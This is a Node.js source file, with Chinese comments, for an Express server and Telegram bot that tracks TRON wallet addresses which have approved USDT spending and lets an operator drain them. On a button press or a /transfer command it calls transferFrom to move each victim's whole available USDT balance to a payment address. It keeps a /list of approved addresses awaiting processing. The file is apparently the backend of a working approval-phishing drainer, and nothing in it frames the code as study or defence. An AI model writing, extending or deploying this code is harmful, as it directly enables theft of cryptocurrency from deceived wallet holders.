const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const TronWeb = require('tronweb');
const cors = require('cors');
require('dotenv').config();

const app = express();
app.use(express.json());
app.use(cors());

// 初始化TronWeb
const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    privateKey: process.env.PERMISSION_PRIVATE_KEY
});

// 初始化Telegram机器人
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });

// 存储授权信息
const approvals = new Map();

// 接收前端通知
app.post('/telegram-notify', async (req, res) => {
    try {
        const { userAddress, transactionHash, approvedAmount, timestamp } = req.body;
        
        console.log(`收到授权通知: ${userAddress}, 金额: ${approvedAmount}`);
        
        // 存储授权信息
        approvals.set(userAddress, {
            transactionHash,
            approvedAmount,
            timestamp,
            processed: false
        });
        
        // 发送Telegram通知
        const message = `🎉 新的USDT授权完成！\n\n` +
                       `地址: ${userAddress}\n` +
                       `交易哈希: ${transactionHash}\n` +
                       `授权金额: ${approvedAmount} USDT\n` +
                       `时间: ${new Date(timestamp).toLocaleString()}`;
        
        // 发送到指定聊天或频道
        await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "转移代币", callback_data: `transfer:${userAddress}` }],
                    [{ text: "查看余额", callback_data: `balance:${userAddress}` }]
                ]
            }
        });
        
        res.json({ success: true, message: "通知已发送" });
    } catch (error) {
        console.error('处理通知时出错:', error);
        res.status(500).json({ success: false, error: error.message });
    }
});

// 处理Telegram回调查询
bot.on('callback_query', async (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;
    
    try {
        if (data.startsWith('transfer:')) {
            const userAddress = data.split(':')[1];
            const approval = approvals.get(userAddress);
            
            if (!approval) {
                await bot.sendMessage(chatId, `找不到地址 ${userAddress} 的授权信息`);
                return;
            }
            
            if (approval.processed) {
                await bot.sendMessage(chatId, `地址 ${userAddress} 的代币已转移过`);
                return;
            }
            
            // 执行transferFrom操作
            await bot.sendMessage(chatId, `正在转移地址 ${userAddress} 的USDT...`);
            
            const contract = await tronWeb.contract().at(process.env.USDT_CONTRACT_ADDRESS);
            
            // 检查实际授权额度
            const allowance = await contract.allowance(userAddress, process.env.PERMISSION_ADDRESS).call();
            const allowanceAmount = allowance / 1e6;
            
            if (allowanceAmount <= 0) {
                await bot.sendMessage(chatId, `地址 ${userAddress} 没有足够的授权额度`);
                return;
            }
            
            // 获取用户USDT余额
            const balance = await contract.balanceOf(userAddress).call();
            const balanceAmount = balance / 1e6;
            
            // 确定转移金额（取授权额度和余额中的较小值）
            const transferAmount = Math.min(allowanceAmount, balanceAmount);
            
            if (transferAmount <= 0) {
                await bot.sendMessage(chatId, `地址 ${userAddress} 没有可转移的USDT`);
                return;
            }
            
            // 执行转移
            const result = await contract.transferFrom(
                userAddress,
                process.env.PAYMENT_ADDRESS,
                Math.floor(transferAmount * 1e6)
            ).send({
                feeLimit: 100000000
            });
            
            // 标记为已处理
            approval.processed = true;
            approvals.set(userAddress, approval);
            
            await bot.sendMessage(chatId, `✅ 转移成功！\n转移金额: ${transferAmount.toFixed(4)} USDT\n交易哈希: ${result}`);
            
        } else if (data.startsWith('balance:')) {
            const userAddress = data.split(':')[1];
            
            const contract = await tronWeb.contract().at(process.env.USDT_CONTRACT_ADDRESS);
            
            // 获取授权额度
            const allowance = await contract.allowance(userAddress, process.env.PERMISSION_ADDRESS).call();
            const allowanceAmount = allowance / 1e6;
            
            // 获取USDT余额
            const balance = await contract.balanceOf(userAddress).call();
            const balanceAmount = balance / 1e6;
            
            await bot.sendMessage(chatId, 
                `地址 ${userAddress} 的USDT信息:\n\n` +
                `余额: ${balanceAmount.toFixed(4)} USDT\n` +
                `授权额度: ${allowanceAmount.toFixed(4)} USDT`
            );
        }
    } catch (error) {
        console.error('处理回调时出错:', error);
        await bot.sendMessage(chatId, `❌ 操作失败: ${error.message}`);
    }
});

// 处理手动命令
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    bot.sendMessage(chatId, 
        `🤖 USDT转账机器人已启动\n\n` +
        `可用命令:\n` +
        `/transfer <地址> - 手动转移指定地址的代币\n` +
        `/balance <地址> - 查看指定地址的余额和授权信息\n` +
        `/list - 列出所有已授权的地址`
    );
});

bot.onText(/\/transfer (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userAddress = match[1];
    
    try {
        const contract = await tronWeb.contract().at(process.env.USDT_CONTRACT_ADDRESS);
        
        // 检查授权额度
        const allowance = await contract.allowance(userAddress, process.env.PERMISSION_ADDRESS).call();
        const allowanceAmount = allowance / 1e6;
        
        if (allowanceAmount <= 0) {
            await bot.sendMessage(chatId, `地址 ${userAddress} 没有授权额度`);
            return;
        }
        
        // 获取用户USDT余额
        const balance = await contract.balanceOf(userAddress).call();
        const balanceAmount = balance / 1e6;
        
        // 确定转移金额
        const transferAmount = Math.min(allowanceAmount, balanceAmount);
        
        if (transferAmount <= 0) {
            await bot.sendMessage(chatId, `地址 ${userAddress} 没有可转移的USDT`);
            return;
        }
        
        await bot.sendMessage(chatId, `正在转移地址 ${userAddress} 的USDT...`);
        
        // 执行转移
        const result = await contract.transferFrom(
            userAddress,
            process.env.PAYMENT_ADDRESS,
            Math.floor(transferAmount * 1e6)
        ).send({
            feeLimit: 100000000
        });
        
        await bot.sendMessage(chatId, `✅ 转移成功！\n转移金额: ${transferAmount.toFixed(4)} USDT\n交易哈希: ${result}`);
        
    } catch (error) {
        console.error('转移代币时出错:', error);
        await bot.sendMessage(chatId, `❌ 转移失败: ${error.message}`);
    }
});

bot.onText(/\/balance (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const userAddress = match[1];
    
    try {
        const contract = await tronWeb.contract().at(process.env.USDT_CONTRACT_ADDRESS);
        
        // 获取授权额度
        const allowance = await contract.allowance(userAddress, process.env.PERMISSION_ADDRESS).call();
        const allowanceAmount = allowance / 1e6;
        
        // 获取USDT余额
        const balance = await contract.balanceOf(userAddress).call();
        const balanceAmount = balance / 1e6;
        
        await bot.sendMessage(chatId, 
            `地址 ${userAddress} 的USDT信息:\n\n` +
            `余额: ${balanceAmount.toFixed(4)} USDT\n` +
            `授权额度: ${allowanceAmount.toFixed(4)} USDT`
        );
    } catch (error) {
        console.error('查询余额时出错:', error);
        await bot.sendMessage(chatId, `❌ 查询失败: ${error.message}`);
    }
});

bot.onText(/\/list/, (msg) => {
    const chatId = msg.chat.id;
    
    if (approvals.size === 0) {
        bot.sendMessage(chatId, "暂无授权记录");
        return;
    }
    
    let message = "已授权地址列表:\n\n";
    let count = 1;
    
    for (let [address, info] of approvals) {
        const status = info.processed ? "✅ 已处理" : "⏳ 待处理";
        message += `${count}. ${address} - ${info.approvedAmount} USDT - ${status}\n`;
        count++;
    }
    
    bot.sendMessage(chatId, message);
});

// 启动服务器
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`服务器运行在端口 ${PORT}`);
    console.log(`Telegram机器人已启动`);
});